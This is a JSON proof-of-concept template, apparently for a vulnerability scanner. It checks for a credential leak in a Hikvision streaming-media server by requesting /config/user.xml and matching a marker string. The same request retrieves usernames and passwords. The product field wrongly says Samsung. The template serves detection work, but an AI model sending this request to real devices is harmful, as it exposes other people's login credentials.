{
    "Name": "Hikvision 流媒体管理服务器敏感信息泄",
    "Description": "Hikvision 流媒体管理服务器敏感信息泄,可获取用户名密码",
    "Product": "Samsung",
    "author": "chumeng",
    "Request":[
        {
        "Method": "GET",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/config/user.xml",
        "Port":"",
        "Data":"",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "131541111"
                },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":""
                }
]}
